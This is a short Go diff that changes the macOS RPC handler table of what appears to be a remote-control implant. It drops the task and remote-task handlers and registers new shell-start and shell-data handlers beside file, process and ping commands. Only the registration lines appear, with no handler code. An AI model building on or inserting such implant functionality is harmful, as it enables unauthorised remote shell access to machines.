@@ -15,8 +15,6 @@ import (
 
 var (
 	darwinHandlers = map[uint32]RPCHandler{
-		pb.MsgTask:       taskHandler,
-		pb.MsgRemoteTask: remoteTaskHandler,
 
 		pb.MsgPsListReq:   psHandler,
 		pb.MsgPing:        pingHandler,
@@ -28,6 +26,9 @@ var (
 		pb.MsgPwdReq:      pwdHandler,
 		pb.MsgRmReq:       rmHandler,
 		pb.MsgMkdirReq:    mkdirHandler,
+
+		pb.MsgShellReq:  startShellHandler,
+		pb.MsgShellData: shellDataHandler,
 	}
 )
 
